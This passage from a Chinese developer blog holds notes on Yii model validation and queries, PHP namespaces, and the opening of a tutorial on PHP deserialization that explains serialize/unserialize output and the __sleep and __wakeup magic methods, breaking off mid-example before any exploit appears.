<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php">usw app\models\Test;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloControllers</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $test = <span class="keyword">new</span> Test;</span></span><br><span class="line"><span class="php">    $test-&gt;id = <span class="number">3</span>;</span></span><br><span class="line"><span class="php">    $test-&gt;title  = <span class="string">'title3'</span>;</span></span><br><span class="line"><span class="php">    $test-&gt;save();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>接下来使用rules 进行验证<br>model文件夹下的Test.php内容</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">models</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">ActiveRecord</span>;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">ActiveRecord</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> [</span></span><br><span class="line"><span class="php">    [<span class="string">'id'</span>,<span class="string">'integer'</span>],</span></span><br><span class="line"><span class="php">    [<span class="string">'tittle'</span>,<span class="string">'string'</span>,<span class="string">'length'</span>=&gt;[<span class="number">0</span>,<span class="number">5</span>]]</span></span><br><span class="line"><span class="php">    ];</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>控制器HelloController.php代码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">models</span>\<span class="title">Test</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $test = <span class="keyword">new</span> Test;</span></span><br><span class="line"><span class="php">    $test-&gt;id = <span class="string">'zxc'</span>;</span></span><br><span class="line"><span class="php">    $test-&gt;tittle  = <span class="string">'title3'</span>;</span></span><br><span class="line"><span class="php">    $test-&gt;validate();</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($test-&gt;hasErrors())&#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">echo</span> <span class="string">"data is error"</span>;</span></span><br><span class="line"><span class="php">      <span class="keyword">die</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $test-&gt;save();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>当id 为字符时  不满足验证器0-5 的访问  返回data  error</p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0n6zz19mjj30jb06qmxa.jpg" alt=""></p>
<p>接下来进行修改操作</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">models</span>\<span class="title">Test</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    $test = Test::find()-&gt;where([<span class="string">'id'</span>=&gt;<span class="number">1</span>])-&gt;one();  <span class="comment">//取出一角数据放在noe 而不是all()</span></span></span><br><span class="line"><span class="php">    $test-&gt;tittle = <span class="string">'title4'</span>;  <span class="comment">// 进行修改</span></span></span><br><span class="line"><span class="php">    $test-&gt;save();  <span class="comment">// 然后进行保存</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>可以加个判断<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0n7inujhij30x90fhwg0.jpg" alt=""><br>接下来进行 <strong>关联查询</strong><br>所谓关联查询 就是 比如有两张表 1顾客表 2订单表 多个订单对应一个顾客  形成一对多的关系 一个订单对应 一个顾客 形成一对一的关系</p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ncblgpkvj30re0e5jtk.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0nccfw7spj30wk0ewmzh.jpg" alt=""><br>接下来编写 order.php  customer.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0nc9oikinj311b0gz40d.jpg" alt=""></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ncap4qgxj30zw0at3z1.jpg" alt=""></p>
<p>成功得到数据</p>
<p>但是在控制器进行数据库的操作不满足mvc 在model类 进行封装一个 操作数据库的类<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ncmus1rgj31160jbjtm.jpg" alt=""></p>
<p>  在进行查询的时候 会把查询内容放到select 语句中,当这个数据更新时不会再进行select 而是拿上次slect 的结果 所以如果要再进行select 时  需要用unset()释放那个结果</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/03/01/YII基础学习笔记/" data-id="cjvrp4gli002m5gqros0it0ha" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/开发/">开发</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-namespace命名空间" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/02/26/namespace命名空间/" class="article-date">
  <time datetime="2019-02-26T13:24:05.000Z" itemprop="datePublished">2019-02-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/02/26/namespace命名空间/">namespace命名空间</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="namespace解决命名冲突问题"><a href="#namespace解决命名冲突问题" class="headerlink" title="namespace解决命名冲突问题"></a>namespace解决命名冲突问题</h2><p>a.php</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// namespace a\b\c;</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">get_info</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'this is A'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>b.php</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// namespace a\b\d;</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">get_info</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'this is B'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>index.php</p>
<figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">include</span>(<span class="symbol">'a</span>.php');</span><br><span class="line"><span class="keyword">include</span>(<span class="symbol">'b</span>.php');</span><br></pre></td></tr></table></figure>
<p>访问index.php时会报错<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4cyogo9j30ui023q2w.jpg" alt=""><br>当加上namepase时, 就不会报错</p>
<p>当实例化对象时 也要加上命名空间</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$a</span> = new a\b\c\Apple();</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$a</span>-&gt;get_info();</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4jt2b20j30fd043q2q.jpg" alt=""><br>可以加上use a\b\c\Apple<br>以后实例化就不用加上前面的重复代码了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">c</span>\<span class="title">Apple</span>;</span><br><span class="line">$a = <span class="keyword">new</span> Apple();</span><br><span class="line">$a2 = <span class="keyword">new</span> Apple();</span><br><span class="line">$a3 = <span class="keyword">new</span> Apple();</span><br><span class="line"></span><br><span class="line">$a-&gt;get_info();</span><br><span class="line">$a2-&gt;get_info();</span><br><span class="line">$a3-&gt;get_info();</span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4nnecr0j309l01n0si.jpg" alt=""><br>如果我们想实例化B.php里面的Apple时</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$b</span> = new a\b\d\Apple();</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">$b</span>-&gt;get_info();</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4sqmw2ej307202fgld.jpg" alt=""><br>但是如果我们多次使用时也会造成 重复多余<br>如果加上use a\b\d\Apple;<br>会与use a\b\c\Apple  产生冲突 ,于是利用取别名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">c</span>\<span class="title">Apple</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">d</span>\<span class="title">Apple</span> <span class="title">as</span> <span class="title">BApple</span>;</span><br><span class="line"><span class="comment">// $a = new Apple();</span></span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> BApple();</span><br><span class="line"></span><br><span class="line">$b-&gt;get_info();</span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k4wu4ur7j305301u3y9.jpg" alt=""></p>
<p>当有个c.php</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Apple</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">get_info</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'this is C'</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>当在index.php调用c.php中的Apple<br>此为全局顶层类,要想对全局顶层类进行实例化 需要在实例化加上反斜杠</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'a.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'b.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'c.php'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">c</span>\<span class="title">Apple</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">use</span> <span class="title">a</span>\<span class="title">b</span>\<span class="title">d</span>\<span class="title">Apple</span> <span class="title">as</span> <span class="title">BApple</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$b = <span class="keyword">new</span> BApple();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$c = <span class="keyword">new</span> \Apple();</span></span><br><span class="line"><span class="php">$c-&gt;get_info();</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0k54g6i57j309n02ejr5.jpg" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/02/26/namespace命名空间/" data-id="cjvrp4gks001r5gqrero2jjjz" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/开发/">开发</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-php反序列化漏洞入门到放弃" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/01/27/php反序列化漏洞入门到放弃/" class="article-date">
  <time datetime="2019-01-27T07:02:24.000Z" itemprop="datePublished">2019-01-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/01/27/php反序列化漏洞入门到放弃/">php反序列化漏洞入门到放弃</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>序列化就是:<br>将php变量比如php数组或者对象转换为字节流,字节流可以储存在数据库里面</p>
<p>相关函数:</p>
<pre><code>serialize()              //将对象转换为字符串
unserialize()           // 将字符串还原为一个对象
addslashes()                // 对写入数据库的数据进行处理,
stripslashes()                //对数据进行处理
</code></pre><p>   相关方法:</p>
<pre><code>__wakeup() //使用unserialize时触发
__sleep() //使用serialize时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发,调用不到方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当脚本尝试将对象调用为函数时触发
</code></pre><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p><strong>例子</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $flag = <span class="string">"123"</span>;   <span class="comment">//序列化后为 &lt;0x00&gt;test&lt;0x00&gt;flag</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $flag1 = <span class="string">"123"</span>;   <span class="comment">//序列化后为flag</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $a =<span class="string">"aaa"</span>;        <span class="comment">// 序列化后为a</span></span></span><br><span class="line"><span class="php">    <span class="keyword">static</span> $b =<span class="string">"bbb"</span>;        <span class="comment">// 序列化后不存在与序列化后的字符串内   </span></span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $c= <span class="string">"ccc"</span>;     <span class="comment">//序列化后  &lt;0x00&gt;*&lt;0x00&gt;c</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$test1  = <span class="keyword">new</span> test;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$data = serialize($test1); <span class="comment">//将对象进行序列化为字符串</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $data.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输出</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"test"</span><span class="selector-pseudo">:4</span>:&#123;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"&lt;0x00&gt;&lt;test&gt;&lt;0x00&gt;flag"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"123"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"flag1"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"123"</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"a"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"aaa"</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"&lt;0x00&gt;*&lt;0x00&gt;c"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"ccc"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>0:4:”test”:4<br>代表 O为对象 站四个字符为test 有4个属性<br>{} 里面的为 属性昵称 和 属性值<br>格式:{类型:变量长度:”变量名”；类型:变量值长度:”变量值”}  //六个 : 为一组 前三个代表属性名 后三个代表属性值</p>
<p>注:<br>私有属性会在 text两边加上空子节 所以长度为10<br>保护属性同样也会在*两边加空字节<0x00><0x00></0x00></0x00></p>
<p><strong>进行反序列化</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data1</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">//<span class="built_in">echo</span> <span class="variable">$data1</span>.<span class="string">"\n"</span>;  <span class="built_in">echo</span> 只能输出字符串且不换行  所以输出对象时会报错</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$data1</span>);</span><br></pre></td></tr></table></figure>
<pre><code>object(test)#2 (4) {
  [&quot;flag&quot;:&quot;test&quot;:private]=&gt;
  string(3) &quot;123&quot;
  [&quot;flag1&quot;]=&gt;
  string(3) &quot;123&quot;
  [&quot;a&quot;]=&gt;
  string(3) &quot;aaa&quot;
  [&quot;c&quot;:protected]=&gt;
  string(3) &quot;ccc&quot;
}
</code></pre><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p><strong>__sleep()</strong><br>在进行序列化的时候<br>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误</p>
<p>通俗的讲就是 对象的哪些属性应该被序列化<br><strong>sleep方法<strong>必须返回一个数组</strong>,包含需要串行化的属性. PHP会抛弃其它属性的值. 如果没有</strong>sleep方法,PHP将保存所有属性.</p>
<p><strong>__wakeup()</strong><br>unserialize() 会检查是否存在一个 <strong>wakeup() 方法。如果存在，则会先调用 </strong>wakeup 方法，预先准备对象需要的资源。<br><strong>wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。<br>通俗讲就是还会对</strong>wakeup里面的属性进行反序列化</p>
<p>这两个方法都不接受参数,</p>
<p><strong>实例</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ID = $ID;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;sex = $sex;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;age = $age;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;a = <span class="string">"aaa"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;b = <span class="string">"bbb"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;info . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> [<span class="string">'ID'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>];  <span class="comment">// info 属性不会被序列化</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;c = <span class="string">"ccc"</span>;  <span class="comment">// 属性c会被序列化 属性a不会</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$me = <span class="keyword">new</span> Caiji(<span class="string">'twosmi1e'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$me-&gt;getInfo();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span 